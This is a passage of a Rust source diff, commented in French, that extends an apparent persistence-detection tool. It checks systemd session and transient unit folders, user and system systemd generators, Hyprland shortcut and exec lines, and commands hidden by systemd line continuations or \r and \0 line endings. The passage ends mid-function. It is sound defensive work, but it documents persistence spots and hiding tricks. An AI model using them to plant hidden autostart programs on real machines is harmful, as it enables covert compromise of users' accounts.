@@ -318,13 +318,20 @@ pub(super) fn persistance_dans(
             .map(std::path::PathBuf::from)
             .filter(|p| p.is_absolute() && *p != maison.join(defaut))
     };
+    let runtime = variable("XDG_RUNTIME_DIR")
+        .map(std::path::PathBuf::from)
+        .filter(|p| p.is_absolute());
+    let session = runtime.clone().or_else(|| {
+        use std::os::unix::fs::MetadataExt as _;
+        let uid = std::fs::metadata("/proc/self").ok()?.uid();
+        Some(std::path::PathBuf::from(format!("/run/user/{uid}")))
+    });
     let mut t = Lancements {
         r: Releveur {
             racine: racine.to_path_buf(),
             maison: maison.to_path_buf(),
-            runtime: variable("XDG_RUNTIME_DIR")
-                .map(std::path::PathBuf::from)
-                .filter(|p| p.is_absolute()),
+            runtime,
+            session,
             config: deplace("XDG_CONFIG_HOME", ".config"),
             donnees: deplace("XDG_DATA_HOME", ".local/share"),
             zdot: deplace("ZDOTDIR", ""),
@@ -394,6 +401,19 @@ pub(super) fn persistance_dans(
             }
         }
     }
+    // Les dossiers de la session où systemd range des unités : illisibles, ce qu'ils lancent n'est pas vérifié.
+    if let Some(session) = t.r.session.clone() {
+        for d in std::iter::once("systemd").chain(DOSSIERS_DE_LA_SESSION) {
+            let chemin = t.r.sous(&session.join(d));
+            let Err(e) = std::fs::read_dir(&chemin) else {
+                continue;
+            };
+            if e.kind() == std::io::ErrorKind::NotFound {
+                continue;
+            }
+            dossier_illisible(&mut t, &chemin, &e);
+        }
+    }
     let (mut demarrage, mut hypr) = fichiers_de_demarrage(&t.r);
     let mut configuration = fichiers_de_configuration(&t.r);
     let (environnement, hypr_lus) = environnement(&t.r, configuration.clone(), hypr.clone());
@@ -409,6 +429,7 @@ pub(super) fn persistance_dans(
     configuration.extend(hypr);
     juger_configuration(&configuration, &demarrage, maison, &mut t);
     juger_demarrage(&demarrage, maison, &mut t);
+    juger_generateurs(&mut t);
     juger_cron(racine, crontab, &mut t);
     let services = services_ajoutes(racine, gestion, &mut t.r);
     let mut constats = vec![constat_des_lancements(t)];
@@ -439,6 +460,9 @@ struct Releveur {
     racine: std::path::PathBuf,
     maison: std::path::PathBuf,
     runtime: Option<std::path::PathBuf>,
+    /// Le dossier de la session lu pour la détection : XDG_RUNTIME_DIR, sinon celui que systemd donne à ce compte
+    /// (/run/user/<uid>). Les unités qu'il garde se lisent même quand la variable manque.
+    session: Option<std::path::PathBuf>,
     /// XDG_CONFIG_HOME et XDG_DATA_HOME, s'ils mènent ailleurs que les dossiers par défaut du dossier personnel.
     config: Option<std::path::PathBuf>,
     donnees: Option<std::path::PathBuf>,
@@ -487,6 +511,13 @@ impl Releveur {
                     .any(|d| f.starts_with(self.sous(d))))
     }
 
+    /// Un fichier du dossier de la session (XDG_RUNTIME_DIR/systemd) : unités et générateurs que systemd y range.
+    fn de_la_session(&self, f: &Path) -> bool {
+        self.session
+            .as_ref()
+            .is_some_and(|d| f.starts_with(self.sous(&d.join("systemd"))))
+    }
+
     /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
     /// corpus) ; le dossier personnel y est déjà.
     fn sous(&self, chemin: &Path) -> std::path::PathBuf {
@@ -522,11 +553,31 @@ enum Sorte {
     },
     Bureau,
     Shell,
+    /// Un lancement que la détection voit depuis ce lot, sans qu'il puisse être déclaré normal (`hors_du_perimetre`).
+    Ajoutee(Ajout),
+}
+
+/// Les lancements vus par le lot de détection de la persistance : levés comme les autres, jamais déclarables.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Ajout {
+    /// Une ligne d'unité (ou de .desktop, `bureau`) faite de plusieurs lignes écrites, jointes comme systemd les
+    /// joint (« \ » en fin de ligne), ou coupée par une fin de ligne que seul systemd voit (« \r », « \0 »).
+    Jointe { bureau: bool, utilisateur: bool },
+    /// Une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) : systemd et les programmes du compte l'écrivent.
+    Session,
+    /// Un raccourci de Hyprland qui lance une commande (« bind… = …, exec, … »), ou un appel Lua qui en lance une.
+    Raccourci,
+    /// Un lancement de Hyprland précédé de règles (« exec-once = [workspace 2] … »).
+    LancementHypr,
+    /// Un générateur de systemd, lancé à chaque démarrage de la session (pas une ligne : un programme).
+    Generateur,
 }
 
 impl Sorte {
     fn de(f: &Path, r: &Releveur) -> Sorte {
-        if f.extension().is_some_and(|x| x == "desktop") {
+        if r.de_la_session(f) {
+            Sorte::Ajoutee(Ajout::Session)
+        } else if f.extension().is_some_and(|x| x == "desktop") {
             Sorte::Bureau
         } else if r.dans_hypr(f) || r.hypr_inclus.iter().any(|h| h == f) || f.extension().is_some_and(|x| x == "lua") {
             Sorte::Shell
@@ -539,10 +590,23 @@ impl Sorte {
 
     fn contexte(self, maison: &str) -> designes::Contexte<'_> {
         match self {
-            Sorte::Unite { utilisateur: true } => designes::Contexte::Unite(Some(maison)),
-            Sorte::Unite { utilisateur: false } => designes::Contexte::Unite(None),
-            Sorte::Bureau => designes::Contexte::Bureau,
-            Sorte::Shell => designes::Contexte::Shell,
+            Sorte::Unite { utilisateur: true }
+            | Sorte::Ajoutee(
+                Ajout::Jointe {
+                    bureau: false,
+                    utilisateur: true,
+                }
+                | Ajout::Session,
+            ) => designes::Contexte::Unite(Some(maison)),
+            Sorte::Unite { utilisateur: false }
+            | Sorte::Ajoutee(Ajout::Jointe {
+                bureau: false,
+                utilisateur: false,
+            }) => designes::Contexte::Unite(None),
+            Sorte::Bureau | Sorte::Ajoutee(Ajout::Jointe { bureau: true, .. }) => designes::Contexte::Bureau,
+            Sorte::Shell | Sorte::Ajoutee(Ajout::Raccourci | Ajout::LancementHypr | Ajout::Generateur) => {
+                designes::Contexte::Shell
+            }
         }
     }
 }
@@ -864,6 +928,7 @@ fn hors_du_perimetre(
     let ou = crate::ui::affichable(&court(fichier, &r.maison));
     let hypr = r.dans_hypr(fichier);
     match sorte {
+        Sorte::Ajoutee(ajout) => Some(refus_ajoute(ajout, &ou, numero)),
         Sorte::Unite { utilisateur: true } if r.du_compte(fichier) || de_root_seul(fichier) => None,
         Sorte::Unite { utilisateur: true } => Some(temoins::Refus(trf!(
             "{ou}:{numero} : une unité de /etc/systemd/user que le compte peut changer (le fichier ou un dossier de son chemin n'est pas à root seul) ne peut pas être déclarée normale : rends-la à root ou retire la ligne",
@@ -890,6 +955,33 @@ fn hors_du_perimetre(
         }
         _ => Some(hors_des_deux(&format!("{ou}:{numero}"))),
     }
+}
+
+/// Le refus d'un lancement vu par le lot de détection de la persistance (`Ajout`), avec sa raison et où il est (`ou`
+/// affichable, `numero` de sa première ligne ; un générateur, programme et non ligne, se montre par son seul chemin).
+fn refus_ajoute(ajout: Ajout, ou: &str, numero: usize) -> temoins::Refus {
+    temoins::Refus(match ajout {
+        Ajout::Jointe { .. } => trf!(
+            "{ou}:{numero} : une ligne coupée par « \\ » en fin de ligne (ou par une fin de ligne que seul systemd voit) ne peut pas être déclarée normale : écrivez-la sur une seule ligne, ou retirez-la",
+            "{ou}:{numero}: a line split by \"\\\" at the end of a line (or by a line ending only systemd sees) cannot be declared normal: write it on a single line, or remove it"
+        ),
+        Ajout::Session => trf!(
+            "{ou}:{numero} : une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) ne peut pas être déclarée normale : un programme du compte l'écrit et elle disparaît à l'arrêt ; retirez-la ou mettez-la dans ~/.config/systemd/user",
+            "{ou}:{numero}: a unit in the session folder (XDG_RUNTIME_DIR/systemd) cannot be declared normal: a program of the account writes it and it vanishes at shutdown; remove it or put it in ~/.config/systemd/user"
+        ),
+        Ajout::Raccourci => trf!(
+            "{ou}:{numero} : un raccourci de Hyprland qui lance une commande ne peut pas être déclaré normal : retirez la ligne, ou rangez le programme ailleurs que dans un dossier caché ou temporaire",
+            "{ou}:{numero}: a Hyprland shortcut that starts a command cannot be declared normal: remove the line, or store the program outside a hidden or temporary folder"
+        ),
+        Ajout::LancementHypr => trf!(
+            "{ou}:{numero} : un lancement de Hyprland précédé de règles (« [ … ] ») ne peut pas être déclaré normal : retirez la ligne ou ses règles",
+            "{ou}:{numero}: a Hyprland launch preceded by rules (\"[ … ]\") cannot be declared normal: remove the line or its rules"
+        ),
+        Ajout::Generateur => trf!(
+            "{ou} : un générateur de systemd ne peut pas être déclaré normal : retirez-le, ou rendez-le à root s'il vient d'un paquet",
+            "{ou}: a systemd generator cannot be declared normal: remove it, or give it back to root if it comes from a package"
+        ),
+    })
 }
 
 /// Le refus d'une ligne qui n'est ni d'une unité de l'utilisateur ni un lancement de ~/.config/hypr (`ou` affichable).
@@ -1763,31 +1855,126 @@ fn mots_de_systemd(valeur: &str) -> Option<Vec<String>> {
     Some(mots)
 }
 
-/// Les lignes d'une unité ou d'un ajout telles que systemd les lit : sans blancs autour, commentaires (« # », « ; »)
-/// et lignes vides sautés, lignes continuées par « \\ » jointes (un commentaire au milieu est sauté).
+/// Les lignes d'une unité ou d'un ajout telles que systemd les lit (`lignes_de_systemd`), leur seul texte.
 fn lignes_logiques(texte: &str) -> Vec<String> {
-    let mut logiques: Vec<String> = Vec::new();
-    let mut cours = String::new();
-    let mut continue_ = false;
-    for l in texte.lines() {
-        let l = l.trim_matches([' ', '\t']);
-        if l.starts_with(['#', ';']) || (l.is_empty() && !continue_) {
+    lignes_de_systemd(texte).into_iter().map(|l| l.texte).collect()
+}
+
+/// Une ligne d'unité telle que systemd la lit (`lignes_de_systemd`).
+struct LigneDeSystemd {
+    /// Le numéro de sa première ligne, compté en « \n » comme dans un éditeur (à partir de 1).
+    numero: usize,
+    /// Combien de lignes lues par systemd elle joint.
+    lues: usize,
+    /// Sa première ligne lue, telle qu'écrite.
+    premiere: String,
+    /// Son texte, joint et sans blancs autour.
+    texte: String,
+}
+
+/// Les lignes d'une unité, d'un ajout ou d'un .desktop comme les assemble systemd (`config_parse`, systemd 262) :
+/// lues par `lignes_lues_par_systemd`, une ligne dont le premier caractère non blanc est « # » ou « ; » sautée (même
+/// au milieu d'une ligne continuée), la marque d'ordre des octets ôtée de la première ligne lue, une ligne qui finit
+/// par un « \ » non échappé (« \\ » ne continue pas, « \ » suivi d'un blanc non plus) continuée par la suivante, ce
+/// « \ » remplacé par une espace ; une ligne vide finit la continuation, une continuation restée ouverte à la fin du
+/// fichier compte. Le texte final perd ses blancs autour (espace, tabulation, « \n », « \r ») ; une ligne vide se saute.
+/// Rien de plus joint que par systemd : un « \ » joint en trop cacherait la ligne suivante dans la précédente.
+fn lignes_de_systemd(texte: &str) -> Vec<LigneDeSystemd> {
+    const BLANCS: [char; 4] = [' ', '\t', '\n', '\r'];
+    let mut sortie = Vec::new();
+    let mut finir = |mut l: LigneDeSystemd| {
+        let net = l.texte.trim_matches(BLANCS);
+        if !net.is_empty() {
+            l.texte = net.to_string();
+            sortie.push(l);
+        }
+    };
+    let mut cours: Option<LigneDeSystemd> = None;
+    let mut bom_vu = false;
+    // Le numéro en « \n » d'un octet, compté au fil de la lecture (jamais tout le début à chaque ligne).
+    let (mut compte, mut jusqu_a) = (1_usize, 0_usize);
+    for (debut, brute) in lignes_lues_par_systemd(texte) {
+        compte = compte.saturating_add(texte.get(jusqu_a..debut).map_or(0, |a| a.matches('\n').count()));
+        jusqu_a = debut;
+        if brute.trim_start_matches(BLANCS).starts_with(['#', ';']) {
             continue;
         }
-        if let Some(debut) = l.strip_suffix('\\') {
-            cours.push_str(debut);
-            cours.push(' ');
-            continue_ = true;
+        let l = if bom_vu {
+            brute
         } else {
-            cours.push_str(l);
-            logiques.push(std::mem::take(&mut cours));
-            continue_ = false;
+            bom_vu = true;
+            brute.strip_prefix('\u{FEFF}').unwrap_or(brute)
+        };
+        let mut ligne = match cours.take() {
+            Some(mut c) => {
+                c.texte.push_str(l);
+                c.lues = c.lues.saturating_add(1);
+                c
+            }
+            None => LigneDeSystemd {
+                numero: compte,
+                lues: 1,
+                premiere: brute.to_string(),
+                texte: l.to_string(),
+            },
+        };
+        // L'échappement se lit sur le seul morceau ajouté : le texte d'avant finit par l'espace mise à la place
+        // de son « \ », donc sans échappement en cours (systemd relit tout, pour le même résultat).
+        let mut echappe = false;
+        for c in l.chars() {
+            echappe = !echappe && c == '\\';
+        }
+        if echappe {
+            ligne.texte.pop();
+            ligne.texte.push(' ');
+            cours = Some(ligne);
+        } else {
+            finir(ligne);
         }
     }
-    if continue_ {
-        logiques.push(cours);
+    if let Some(c) = cours {
+        finir(c);
     }
-    logiques
+    sortie
+}
+
+/// Les lignes que lit systemd (`read_line`), chacune avec l'octet où elle commence : une fin de ligne est « \n »,
+/// « \r » ou « \0 » ; des fins de sortes différentes à la suite (« \r\n », « \n\r », « \n\0 ») n'en font qu'une, la
+/// même sorte deux fois en fait deux, et « \0 » finit la sienne aussitôt.
+fn lignes_lues_par_systemd(texte: &str) -> Vec<(usize, &str)> {
+    let sorte = |b: u8| match b {
+        b'\n' => 1_u8,
+        b'\r' => 2,
+        0 => 4,
+        _ => 0,
+    };
+    let octets = texte.as_bytes();
+    let mut lignes = Vec::new();
+    let (mut debut, mut i) = (0_usize, 0_usize);
+    while let Some(&b) = octets.get(i) {
+        let mut vues = sorte(b);
+        i = i.saturating_add(1);
+        if vues == 0 {
+            continue;
+        }
+        // Les fins de ligne sont de l'ASCII : les bornes tombent entre deux caractères.
+        lignes.push((debut, texte.get(debut..i.saturating_sub(1)).unwrap_or_default()));
+        while vues & 4 == 0
+            && let Some(&b) = octets.get(i)
+        {
+            let s = sorte(b);
+            if s == 0 || vues & s != 0 {
+                break;
+            }
+            vues |= s;
+            i = i.saturating_add(1);
+        }
+        debut = i;
+    }
+    if debut < octets.len() {
+        lignes.push((debut, texte.get(debut..).unwrap_or_default()));
+    }
+    lignes
 }
 
 /// Les lignes Exec*= d'une unité ou d'un ajout : la directive, sa commande, la ligne entière.
@@ -2354,6 +2541,153 @@ fn fichiers_de_configuration(r: &Releveur) -> Vec<std::path::PathBuf> {
     configuration
 }
 
+/// Les dossiers d'unités de l'utilisateur sous le dossier de la session (XDG_RUNTIME_DIR), dans l'ordre de systemd.
+const DOSSIERS_DE_LA_SESSION: [&str; 6] = [
+    "systemd/user.control",
+    "systemd/transient",
+    "systemd/generator.early",
+    "systemd/user",
+    "systemd/generator",
+    "systemd/generator.late",
+];
+
+/// Un dossier où se rangent des lancements, qui ne se lit pas : une ligne de l'alerte, non vérifié.
+fn dossier_illisible(t: &mut Lancements, chemin: &Path, e: &std::io::Error) {
+    let montre = crate::ui::affichable(&t.r.montre(chemin));
+    t.sources
+        .push(source_de("maison", &format!("illisible {}", t.r.montre(chemin))));
+    t.retraits.push(None);
+    t.temoins.push(Err(temoins::Refus(trf!(
+        "{montre} ne se lit pas : ce qu'il lance n'est pas vérifié",
+        "{montre} cannot be read: what it starts is not checked"
+    ))));
+    t.suspects.push(trf!(
+        "{montre} ne se lit pas ({e}) : ce qu'il lance n'est pas vérifié",
+        "{montre} cannot be read ({e}): what it starts is not checked"
+    ));
+}
+
+/// Au plus autant de programmes lus dans un dossier de générateurs ; au-delà, le reste n'est pas vérifié (dit).
+const GENERATEURS_MAX: usize = 256;
+
+/// Les générateurs de systemd des sessions : des programmes que le gestionnaire de la session lance à chaque
+/// démarrage, avec les droits du compte, avant toute unité (ceux de « user-environment-generators » posent en plus
+/// les variables de toutes les unités). Dans un dossier du compte (~/.config/systemd/user-generators, et
+/// user-environment-generators, ou sous un XDG_CONFIG_HOME déplacé), tout programme est levé : rien de normal ne s'y
+/// range (systemd 262 ne lit pas ces dossiers-là, une autre version ou un autre gestionnaire pourrait). Dans un
+/// dossier du système (/run, /etc, /usr/local/lib, /usr/lib), seul ce que le compte a pu poser ou changer est levé
+/// (`pose_par_le_compte`) : ceux des paquets, à root, ne lèvent rien. Un lien vers /dev/null (un générateur masqué) ne
+/// lance rien. Rien de tout cela ne se déclare normal.
+fn juger_generateurs(t: &mut Lancements) {
+    const NOMS: [&str; 2] = ["user-generators", "user-environment-generators"];
+    let mut dossiers: Vec<(std::path::PathBuf, bool)> = Vec::new();
+    let configs = std::iter::once(t.r.maison.join(".config")).chain(t.r.config.iter().map(|c| t.r.sous(c)));
+    for c in configs {
+        dossiers.extend(NOMS.iter().map(|n| (c.join("systemd").join(n), true)));
+    }
+    for base in [
+        "/run/systemd",
+        "/etc/systemd",
+        "/usr/local/lib/systemd",
+        "/usr/lib/systemd",
+    ] {
+        dossiers.extend(NOMS.iter().map(|n| (t.r.sous(&Path::new(base).join(n)), false)));
+    }
+    dossiers.dedup();
+    let moi = {
+        use std::os::unix::fs::MetadataExt as _;
+        std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid())
+    };
+    let sans_traduction = uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default());
+    for (dossier, du_compte) in dossiers {
+        let entrees = match std::fs::read_dir(&dossier) {
+            Ok(e) => e,
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
+            Err(e) => {
+                dossier_illisible(t, &dossier, &e);
+                continue;
+            }
+        };
+        let mut chemins: Vec<std::path::PathBuf> = entrees.flatten().map(|e| e.path()).collect();
+        chemins.sort();
+        if chemins.len() > GENERATEURS_MAX {
+            let e = std::io::Error::other(trf!(
+                "plus de {GENERATEURS_MAX} fichiers",
+                "more than {GENERATEURS_MAX} files"
+            ));
+            dossier_illisible(t, &dossier, &e);
+            chemins.truncate(GENERATEURS_MAX);
+        }
+        for p in chemins {
+            if let Some(raison) = generateur_suspect(&p, &dossier, du_compte, moi, sans_traduction) {
+                let ou = crate::ui::affichable(&court(&p, &t.r.maison));
+                t.sources.push(source_de(
+                    &crate::modele::id::chemin(&p.to_string_lossy()),
+                    "générateur",
+                ));
+                t.retraits.push(None);
+                let refus = hors_du_perimetre(&t.r, &p, 0, Sorte::Ajoutee(Ajout::Generateur), true)
+                    .unwrap_or_else(|| refus_ajoute(Ajout::Generateur, &ou, 0));
+                t.temoins.push(Err(refus));
+                t.suspects.push(trf!("{ou} : {raison}", "{ou}: {raison}"));
+            }
+        }
+    }
+}
+
+/// Pourquoi le fichier `p` du dossier de générateurs `dossier` se lève, ou `None` : pas un programme (ni fichier ni
+/// lien vers un fichier exécutable), masqué (lien vers /dev/null), ou d'un paquet dans un dossier du système.
+fn generateur_suspect(
+    p: &Path,
+    dossier: &Path,
+    du_compte: bool,
+    moi: u32,
+    sans_traduction: bool,
+) -> Option<&'static str> {
+    use std::os::unix::fs::MetadataExt as _;
+    if std::fs::read_link(p).is_ok_and(|c| c == Path::new("/dev/null")) {
+        return None;
+    }
+    let lien = std::fs::symlink_metadata(p).ok()?;
+    let cible = std::fs::metadata(p).ok()?;
+    if !cible.is_file() || cible.mode() & 0o111 == 0 {
+        return None;
+    }
+    if du_compte {
+        return Some(tr!(
+            "programme dans un dossier de générateurs de systemd du compte : rien de normal ne s'y range (systemd le lancerait à chaque démarrage de la session, avec les droits du compte)",
+            "program in an account systemd generator folder: nothing normal goes there (systemd would start it at each session start, with the account's rights)"
+        ));
+    }
+    // Le lien lui-même (sa permission ne dit rien), le programme, son dossier réel et le dossier lu.
+    let mut proprietes = vec![(lien.uid(), if lien.is_symlink() { 0 } else { lien.mode() })];
+    proprietes.push((cible.uid(), cible.mode()));
+    let reel = std::fs::canonicalize(p).ok()?;
+    for d in [reel.parent(), Some(dossier)].into_iter().flatten() {
+        let Ok(m) = std::fs::metadata(d) else {
+            return Some(tr!(
+                "générateur de systemd des sessions dont le dossier ne se lit pas : non vérifié",
+                "session systemd generator whose folder cannot be read: not checked"
+            ));
+        };
+        proprietes.push((m.uid(), m.mode()));
+    }
+    pose_par_le_compte(&proprietes, moi, sans_traduction).then_some(tr!(
+        "générateur de systemd des sessions que le compte a pu poser ou changer (lui, son lien ou son dossier n'est pas à root seul) : systemd le lance à chaque démarrage de la session",
+        "session systemd generator the account could have placed or changed (it, its link or its folder is not root-only): systemd starts it at each session start"
+    ))
+}
+
+/// Un des fichiers (`proprietes` : propriétaire et permissions de chacun) a pu être posé ou changé par le compte :
+/// écrit par le groupe ou les autres, ou pas à root. Dans un espace de noms d'utilisateurs (`sans_traduction` faux),
+/// root se voit sous une autre identité et le compte peut se voir root : seul ce qui appartient à l'identité de ce
+/// processus (`moi`) compte alors (limite écrite au modèle de menace).
+fn pose_par_le_compte(proprietes: &[(u32, u32)], moi: u32, sans_traduction: bool) -> bool {
+    proprietes
+        .iter()
+        .any(|&(uid, mode)| mode & 0o022 != 0 || if sans_traduction { uid != 0 } else { uid == moi })
+}
+
 /// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), et ceux de
 /// Hyprland à part : ils sont aussi des fichiers de configuration.
 fn fichiers_de_demarrage(r: &Releveur) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
@@ -2390,6 +2724,14 @@ fn fichiers_de_demarrage(r: &Releveur) -> (Vec<std::path::PathBuf>, Vec<std::pat
     }
     if let Some(d) = &r.donnees {
         demarrage.extend(fichiers_de(&r.sous(&d.join("systemd/user")), &UNITES));
+    }
+    // Le dossier de la session : systemd y lit des unités de l'utilisateur (« systemctl --user --runtime », celles de
+    // « systemd-run --user » dans transient/, celles des générateurs). Effacées à l'arrêt, elles lancent quand même
+    // des programmes pendant la session : jugées par leur contenu, comme les autres (`Ajout::Session`).
+    if let Some(s) = &r.session {
+        for d in DOSSIERS_DE_LA_SESSION {
+            demarrage.extend(fichiers_de(&r.sous(&s.join(d)), &UNITES));
+        }
     }
     demarrage.extend(hypr.iter().cloned());
     (demarrage, hypr)
@@ -2497,7 +2839,10 @@ fn juger_lignes_jointes(
     }
 }
 
-/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement.
+/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement. Une unité se lit par ses lignes
+/// telles que systemd les assemble (`lignes_de_systemd`) ; un .desktop par ses lignes écrites, puis par celles que
+/// joint systemd-xdg-autostart-generator ; un fichier de Hyprland par ses lignes, raccourcis compris, et un fichier
+/// Lua aussi par ses appels qui lancent une commande (`appels_lua`).
 fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
     let de_hypr = |f: &Path, r: &Releveur| {
         (r.dans_hypr(f) || r.hypr_inclus.iter().any(|i| i == f)) && f.extension().is_some_and(|x| x == "conf")
@@ -2508,44 +2853,329 @@ fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancement
             continue;
         };
         let sorte = Sorte::de(f, &t.r);
-        let hypr = de_hypr(f, &t.r);
-        for (n, l) in lu.texte.lines().enumerate() {
-            let Some((commande, ambigue)) = commande_lancee_lue(l) else {
-                continue;
-            };
-            let raison = commande_suspecte(&commande, true).or_else(|| {
-                if !hypr || !commande.contains('$') {
-                    return None;
+        let hypr = de_hypr(f, &t.r).then_some(&variables);
+        let ecrites: Vec<&str> = lu.texte.lines().collect();
+        let unite = matches!(sorte, Sorte::Unite { .. } | Sorte::Ajoutee(Ajout::Session));
+        if !unite {
+            for (n, l) in ecrites.iter().enumerate() {
+                let lancee = hypr.and_then(|_| lancement_de_hypr(l)).map_or_else(
+                    || commande_lancee_lue(l).map(|(c, a)| (c, a, sorte)),
+                    |(c, a, ajout)| Some((c, a, Sorte::Ajoutee(ajout))),
+                );
+                if let Some((commande, ambigue, s)) = lancee {
+                    juger_lancement(t, f, &lu, n, l, &commande, ambigue, s, true, hypr);
                 }
-                match resoudre_hypr(&commande, &variables) {
-                    Some(formes) => formes.iter().find_map(|c| commande_suspecte(c, true)),
-                    None => Some(tr!(
-                        "variable de Hyprland ou du shell sans valeur connue : ce que la ligne lance ne se voit pas",
-                        "Hyprland or shell variable without a known value: what the line starts cannot be seen"
-                    )),
-                }
-            });
-            if let Some(raison) = raison {
-                t.sources
-                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
-                t.retraits.push(retrait(f, &lu.texte, l));
-                let maison = maison_texte(t);
-                let d = if ambigue {
-                    Designe::Indefini(designes::Flou::Syntaxe)
-                } else {
-                    designes::commande(&commande, sorte.contexte(&maison))
+            }
+        }
+        if unite || sorte == Sorte::Bureau {
+            let utilisateur = !matches!(sorte, Sorte::Unite { utilisateur: false });
+            for logique in lignes_de_systemd(&lu.texte) {
+                let Some((commande, ambigue)) = commande_lancee_lue(&logique.texte) else {
+                    continue;
                 };
-                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, sorte);
-                t.temoins.push(temoin);
-                t.suspects.push(trf!(
-                    "{}:{} : {raison}",
-                    "{}:{}: {raison}",
-                    court(f, h),
-                    n.saturating_add(1)
-                ));
+                let n = logique.numero.saturating_sub(1);
+                // Écrite sur une seule ligne, telle que systemd la lit : la ligne elle-même, comme avant ce lot.
+                let simple = logique.lues == 1
+                    && ecrites.get(n) == Some(&logique.premiere.as_str())
+                    && logique.premiere.trim_matches([' ', '\t']) == logique.texte;
+                if simple && sorte == Sorte::Bureau {
+                    continue;
+                }
+                let ligne = if simple { &logique.premiere } else { &logique.texte };
+                let s = if simple || matches!(sorte, Sorte::Ajoutee(_)) {
+                    sorte
+                } else {
+                    Sorte::Ajoutee(Ajout::Jointe {
+                        bureau: sorte == Sorte::Bureau,
+                        utilisateur,
+                    })
+                };
+                juger_lancement(t, f, &lu, n, ligne, &commande, ambigue, s, simple, None);
+            }
+        }
+        if f.extension().is_some_and(|x| x == "lua") && t.r.dans_hypr(f) {
+            let mut appels = appels_lua(&ecrites);
+            if appels.len() > APPELS_LUA_MAX {
+                appels.truncate(APPELS_LUA_MAX);
+                non_lu(
+                    f,
+                    h,
+                    t,
+                    tr!(
+                        "trop d'appels Lua pour être tous lus",
+                        "too many Lua calls to read them all"
+                    ),
+                );
+            }
+            for (n, appel, une_ligne) in appels {
+                // Sur une seule ligne, la ligne écrite entière (celle qu'un retrait ôterait) ; sinon l'appel joint.
+                let ligne = ecrites.get(n).filter(|_| une_ligne).map_or(appel.as_str(), |l| l);
+                for commande in chaines_lua(&appel) {
+                    juger_lancement(
+                        t,
+                        f,
+                        &lu,
+                        n,
+                        ligne,
+                        &commande,
+                        false,
+                        Sorte::Ajoutee(Ajout::Raccourci),
+                        une_ligne,
+                        None,
+                    );
+                }
             }
         }
     }
+}
+
+/// Juge la `commande` lancée par la `ligne` (numéro `n`, à partir de 0) du fichier `f` lu `lu` : levée si elle
+/// ressemble à une porte dérobée. `hypr` : les variables de Hyprland, pour un de ses fichiers (une variable sans
+/// valeur connue lève la ligne). `retirable` : la ligne est écrite telle quelle dans le fichier (sinon, jointe ou lue
+/// par morceaux, aucun retrait n'est proposé).
+#[allow(clippy::too_many_arguments)]
+fn juger_lancement(
+    t: &mut Lancements,
+    f: &Path,
+    lu: &Lecture,
+    n: usize,
+    ligne: &str,
+    commande: &str,
+    ambigue: bool,
+    sorte: Sorte,
+    retirable: bool,
+    hypr: Option<&std::collections::BTreeMap<String, Vec<String>>>,
+) {
+    let raison = commande_suspecte(commande, true).or_else(|| {
+        let variables = hypr?;
+        if !commande.contains('$') {
+            return None;
+        }
+        match resoudre_hypr(commande, variables) {
+            Some(formes) => formes.iter().find_map(|c| commande_suspecte(c, true)),
+            None => Some(tr!(
+                "variable de Hyprland ou du shell sans valeur connue : ce que la ligne lance ne se voit pas",
+                "Hyprland or shell variable without a known value: what the line starts cannot be seen"
+            )),
+        }
+    });
+    let Some(raison) = raison else {
+        return;
+    };
+    t.sources
+        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), ligne));
+    t.retraits
+        .push(if retirable { retrait(f, &lu.texte, ligne) } else { None });
+    let maison = maison_texte(t);
+    let designe = if ambigue {
+        Designe::Indefini(designes::Flou::Syntaxe)
+    } else {
+        designes::commande(commande, sorte.contexte(&maison))
+    };
+    let temoin = temoin_de_ligne(t, f, n, lu, ligne, designe, true, sorte);
+    t.temoins.push(temoin);
+    let perso = t.r.maison.clone();
+    t.suspects.push(trf!(
+        "{}:{} : {raison}",
+        "{}:{}: {raison}",
+        court(f, &perso),
+        n.saturating_add(1)
+    ));
+}
+
+/// Ce qu'une ligne d'un fichier .conf de Hyprland lance, au-delà de `commande_lancee_lue` : un raccourci (toute forme
+/// « bind… = MODS, touche, exec, commande », « bindd » avec sa description en plus ; « execr » aussi), ou un
+/// lancement précédé de règles (« exec-once = [workspace 2 silent] commande », jusqu'au premier « ] » comme
+/// Hyprland). La commande, si elle est ambiguë (des règles sans « ] »), et la sorte de la ligne.
+fn lancement_de_hypr(ligne: &str) -> Option<(String, bool, Ajout)> {
+    let l = ligne.trim();
+    if commentaire(l) {
+        return None;
+    }
+    let (cle, valeur) = l.split_once('=')?;
+    let (cle, valeur) = (cle.trim(), valeur.trim());
+    let sans_regles = |v: &str| -> (String, bool) {
+        match v.strip_prefix('[') {
+            Some(reste) => match reste.split_once(']') {
+                Some((_, commande)) => (commande.trim().to_string(), false),
+                None => (v.to_string(), true),
+            },
+            None => (v.to_string(), false),
+        }
+    };
+    if let Some(drapeaux) = cle.strip_prefix("bind") {
+        if !drapeaux.bytes().all(|b| b.is_ascii_lowercase()) {
+            return None;
+        }
+        // « d » ajoute la description avant le répartiteur ; le dernier champ garde ses virgules.
+        let (champs, rang) = if drapeaux.contains('d') { (5, 3) } else { (4, 2) };
+        let mut parts = valeur.splitn(champs, ',');
+        let repartiteur = parts.nth(rang)?.trim();
+        let commande = parts.next().unwrap_or_default().trim();
+        if repartiteur.eq_ignore_ascii_case("exec") {
+            let (c, ambigue) = sans_regles(commande);
+            return Some((c, ambigue, Ajout::Raccourci));
+        }
+        if repartiteur.eq_ignore_ascii_case("execr") {
+            return Some((commande.to_string(), false, Ajout::Raccourci));
+        }
+        return None;
+    }
+    if ["exec-once", "exec"].contains(&cle) && valeur.starts_with('[') {
+        let (c, ambigue) = sans_regles(valeur);
